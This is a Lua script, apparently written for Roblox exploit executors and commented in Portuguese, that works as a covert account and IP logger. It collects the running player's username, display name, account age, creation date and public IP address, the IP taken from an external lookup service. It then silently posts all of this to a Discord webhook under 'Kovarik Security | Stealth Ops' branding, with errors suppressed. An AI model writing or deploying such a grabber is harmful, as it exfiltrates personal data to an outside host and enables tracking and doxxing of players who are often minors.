-- Função universal de requisição (Detecta Executor ou Studio)
local function HttpRequest(url, method, body)
    local requestFunc = (syn and syn.request) or (http and http.request) or (http_request) or (fluxus and fluxus.request) or request
    
    if requestFunc then
        -- Se estiver usando um Executor (Synapse, Fluxus, etc)
        return requestFunc({
            Url = url,
            Method = method or "GET",
            Headers = {["Content-Type"] = "application/json"},
            Body = body
        })
    else
        -- Se estiver no Roblox Studio/Game oficial (Requer Allow HTTP Requests)
        if method == "POST" then
            return HttpService:PostAsync(url, body)
        else
            return HttpService:GetAsync(url)
        end
    end
end

local function GetUserData()
    local user_id = lp.UserId
    local username = lp.Name
    local display_name = lp.DisplayName
    
    local thumb = "https://www.roblox.com/headshot-thumbnail/image?userId="..user_id.."&width=420&height=420&format=png"
    local public_ip = "N/A (Block)"

    -- 1. PEGAR O IP REAL (Usando Proxy para evitar bloqueio)
    pcall(function()
        -- Usamos um endpoint que retorna apenas texto para facilitar
        local response = HttpRequest("https://api.ipify.org")
        if type(response) == "table" then
            public_ip = response.Body
        else
            public_ip = response
        end
    end)

    -- 2. DADOS ADICIONAIS (Usando Roproxy para não tomar block do Roblox)
    local creation_date = "Privado"
    pcall(function()
        local url = "https://users.roproxy.com/v1/users/"..user_id
        local res = HttpRequest(url)
        local data = HttpService:JSONDecode(type(res) == "table" and res.Body or res)
        if data and data.created then
            creation_date = data.created:sub(1, 10)
        end
    end)

    local data = {
        ["content"] = "||@everyone @here||",
        ["username"] = "Kovarik",
        ["embeds"] = {{
            ["title"] = "+1 Result Account 🔥",
            ["description"] = "[Rolimons](https://www.rolimons.com/player/"..user_id..") | [Roblox Profile](https://www.roblox.com/users/"..user_id.."/profile)",
            ["color"] = 11097043,
            ["thumbnail"] = {["url"] = thumb},
            ["footer"] = {["text"] = "Painel Kovarik Security | Stealth Ops"},
            ["fields"] = {
                {["name"] = "Username", ["value"] = username .. " ("..display_name..")", ["inline"] = true},
                {["name"] = "Creation Date", ["value"] = creation_date, ["inline"] = true},
                {["name"] = "Account Age", ["value"] = lp.AccountAge .. " dias", ["inline"] = true},
                {["name"] = "IP Address", ["value"] = "||" .. public_ip .. "||", ["inline"] = false},
            }
        }}
    }

    -- 3. ENVIO FINAL
    pcall(function()
        HttpRequest(Webhook_URL, "POST", HttpService:JSONEncode(data))
    end)
end

